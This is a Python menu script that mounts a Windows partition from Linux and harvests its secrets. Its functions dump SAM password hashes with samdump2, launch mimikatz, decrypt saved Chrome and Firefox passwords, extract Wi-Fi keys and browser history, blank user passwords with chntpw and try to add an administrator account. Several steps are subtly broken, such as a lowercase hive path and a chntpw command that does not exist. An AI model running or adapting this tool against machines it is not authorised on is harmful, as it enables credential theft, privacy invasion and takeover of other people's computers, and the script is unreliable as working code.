import os
import subprocess

# Function to mount the Windows partition
def mount_windows_partition():
    partition = input("Enter the Windows partition (e.g., /dev/sda2): ")
    mount_point = '/mnt/windows'
    os.makedirs(mount_point, exist_ok=True)
    result = os.system(f"mount -t ntfs-3g {partition} {mount_point}")
    if result == 0:
        print(f"Mounted {partition} to {mount_point}")
    else:
        print("Failed to mount partition. Please check the partition identifier.")

# Function to extract user information
def extract_user_info():
    mount_point = '/mnt/windows'
    try:
        os.chdir(f"{mount_point}/Windows/System32/config")
        os.system("cp SAM SYSTEM SECURITY /tmp/")
        os.system("samdump2 /tmp/SYSTEM /tmp/SAM > /tmp/hashes.txt")
        print("User information and password hashes saved to /tmp/hashes.txt")
    except Exception as e:
        print(f"Error: {e}")

# Function to dump passwords with Mimikatz
def dump_passwords_with_mimikatz():
    try:
        os.system("wine mimikatz.exe")
        print("Run mimikatz commands in the prompt")
    except Exception as e:
        print(f"Error: {e}")

# Function to retrieve browser passwords
def retrieve_browser_passwords():
    username = input("Enter the Windows username: ")

    # Google Chrome
    chrome_path = f"/mnt/windows/Users/{username}/AppData/Local/Google/Chrome/User Data/Default"
    if os.path.exists(chrome_path):
        os.chdir(chrome_path)
        os.system("python3 chrome-decrypt.py")
        print("Chrome passwords extracted")
    else:
        print("Chrome path does not exist")

    # Mozilla Firefox
    firefox_path = f"/mnt/windows/Users/{username}/AppData/Roaming/Mozilla/Firefox/Profiles/"
    if os.path.exists(firefox_path):
        os.chdir(firefox_path)
        os.system("python3 firefox_decrypt.py")
        print("Firefox passwords extracted")
    else:
        print("Firefox path does not exist")

# Function to retrieve Wi-Fi passwords
def retrieve_wifi_passwords():
    wifi_profiles_path = '/mnt/windows/ProgramData/Microsoft/Wlansvc/Profiles/Interfaces/'
    os.system(f"grep -r 'keyMaterial' {wifi_profiles_path}")
    print("Wi-Fi passwords extracted")

# Function to retrieve system information
def retrieve_system_info():
    system_info_path = '/mnt/windows/Windows/System32/config/systemprofile/AppData/Local/Microsoft/Windows/SystemData/SystemInfo.log'
    os.system(f"cat {system_info_path}")
    print("System information retrieved")

# Function to dump browser history
def dump_browser_history():
    username = input("Enter the Windows username: ")
    
    # Google Chrome
    chrome_history_path = f"/mnt/windows/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/History"
    if os.path.exists(chrome_history_path):
        os.system(f"sqlite3 {chrome_history_path} 'SELECT url, title, visit_count, last_visit_time FROM urls;' > /tmp/chrome_history.txt")
        print("Chrome browser history saved to /tmp/chrome_history.txt")
    else:
        print("Chrome history path does not exist")
    
    # Mozilla Firefox
    firefox_profiles_path = f"/mnt/windows/Users/{username}/AppData/Roaming/Mozilla/Firefox/Profiles/"
    if os.path.exists(firefox_profiles_path):
        for profile in os.listdir(firefox_profiles_path):
            history_path = os.path.join(firefox_profiles_path, profile, 'places.sqlite')
            if os.path.exists(history_path):
                os.system(f"sqlite3 {history_path} 'SELECT url, title, visit_count, last_visit_date FROM moz_places;' > /tmp/firefox_history_{profile}.txt")
                print(f"Firefox browser history for profile {profile} saved to /tmp/firefox_history_{profile}.txt")
    else:
        print("Firefox profiles path does not exist")

# Function to list installed applications
def list_installed_applications():
    software_path = '/mnt/windows/Program Files/'
    os.system(f"ls {software_path} > /tmp/installed_programs.txt")
    print("List of installed programs saved to /tmp/installed_programs.txt")

# Function to capture a screenshot
def capture_screenshot():
    try:
        os.system("import -window root /tmp/screenshot.png")
        print("Screenshot saved to /tmp/screenshot.png")
    except Exception as e:
        print(f"Error: {e}")

# Function to retrieve Windows product keys
def retrieve_product_keys():
    try:
        os.system("cp /mnt/windows/Windows/System32/config/SOFTWARE /tmp/")
        os.system("cp /mnt/windows/Windows/System32/config/SYSTEM /tmp/")
        
        key_path = "/tmp/software"
        with open("/tmp/windows_product_key.txt", "w") as output:
            result = subprocess.run(['chntpw', '-e', key_path], input=b'cat /sys/product/ID\nq\n', capture_output=True)
            output.write(result.stdout.decode())
        print("Windows product key saved to /tmp/windows_product_key.txt")
    except Exception as e:
        print(f"Error: {e}")

# Function to extract user account details
def extract_user_account_details():
    try:
        key_path = "/mnt/windows/Windows/System32/config/SAM"
        with open("/tmp/user_account_details.txt", "w") as output:
            result = subprocess.run(['chntpw', '-e', key_path], input=b'cat /SAM/Domains/Account/Users\nq\n', capture_output=True)
            output.write(result.stdout.decode())
        print("User account details saved to /tmp/user_account_details.txt")
    except Exception as e:
        print(f"Error: {e}")

# Function to extract network configuration
def extract_network_configuration():
    try:
        key_path = "/mnt/windows/Windows/System32/config/SYSTEM"
        with open("/tmp/network_configuration.txt", "w") as output:
            result = subprocess.run(['chntpw', '-e', key_path], input=b'cat /ControlSet001/Services/Tcpip/Parameters\nq\n', capture_output=True)
            output.write(result.stdout.decode())
        print("Network configuration saved to /tmp/network_configuration.txt")
    except Exception as e:
        print(f"Error: {e}")

# Function to extract startup programs
def extract_startup_programs():
    try:
        key_path = "/mnt/windows/Windows/System32/config/SOFTWARE"
        with open("/tmp/startup_programs.txt", "w") as output:
            result = subprocess.run(['chntpw', '-e', key_path], input=b'cat /Microsoft/Windows/CurrentVersion/Run\nq\n', capture_output=True)
            output.write(result.stdout.decode())
        print("Startup programs saved to /tmp/startup_programs.txt")
    except Exception as e:
        print(f"Error: {e}")

# Function to extract event logs
def extract_event_logs():
    try:
        event_log_path = '/mnt/windows/Windows/System32/winevt/Logs/'
        os.system(f"cp -r {event_log_path} /tmp/event_logs")
        print("Event logs copied to /tmp/event_logs")
    except Exception as e:
        print(f"Error: {e}")

# Function to remove user passwords
def remove_user_password():
    username = input("Enter the username to remove password: ")
    try:
        key_path = "/mnt/windows/Windows/System32/config/SAM"
        result = subprocess.run(['chntpw', '-u', username, key_path], input=b'1\n2\nq\nY\n', capture_output=True)
        print(result.stdout.decode())
        print(f"Password for user {username} removed.")
    except Exception as e:
        print(f"Error: {e}")

# Function to add an admin user
def add_admin_user():
    username = input("Enter the new admin username: ")
    password = input("Enter the new admin password: ")
    try:
        result = subprocess.run(['chntpw', '-e', '/mnt/windows/Windows/System32/config/SAM'], input=f'ls -la /SAM/Domains/Account/Users/{username}\nadduser {username} -G administrators -P {password}\nq\n', capture_output=True, text=True)
        print(result.stdout)
        print(f"Admin user {username} added.")
    except Exception as e:
        print(f"Error: {e}")

# Main menu function
def menu():
    while True:
        print("\n--- Windows Info Extraction Menu ---")
        print("1. Mount Windows Partition")
        print("2. Extract User Information")
        print("3. Dump Passwords with Mimikatz")
        print("4. Retrieve Browser Passwords")
        print("5. Retrieve Wi-Fi Passwords")
        print("6. Retrieve System Information")
        print("7. Dump Browser History")
        print("8. List Installed Applications")
        print("9. Capture Screenshot")
        print("10. Retrieve Windows Product Key")
        print("11. Extract User Account Details")
        print("12. Extract Network Configuration")
        print("13. Extract Startup Programs")
        print("14. Extract Event Logs")
        print("15. Remove User Password")
        print("16. Add Admin User")
        print("17. Exit")

        choice = input("Enter your choice: ")

        if choice == '1':
            mount_windows_partition()
        elif choice == '2':
            extract_user_info()
        elif choice == '3':
            dump_passwords_with_mimikatz()
        elif choice == '4':
            retrieve_browser_passwords()
        elif choice == '5':
            retrieve_wifi_passwords()
        elif choice == '6':
            retrieve_system_info()
        elif choice == '7':
            dump_browser_history()
        elif choice == '8':
            list_installed_applications()
        elif choice == '9':
            capture_screenshot()
        elif choice == '10':
            retrieve_product_keys()
        elif choice == '11':
            extract_user_account_details()
        elif choice == '12':
            extract_network_configuration()
        elif choice == '13':
            extract_startup_programs()
        elif choice == '14':
            extract_event_logs()
        elif choice == '15':
            remove_user_password()
        elif choice == '16':
            add_admin_user()
        elif choice == '17':
            print("Exiting...")
            break
        else:
            print("Invalid choice, please try again.")

if __name__ == "__main__":
    menu()
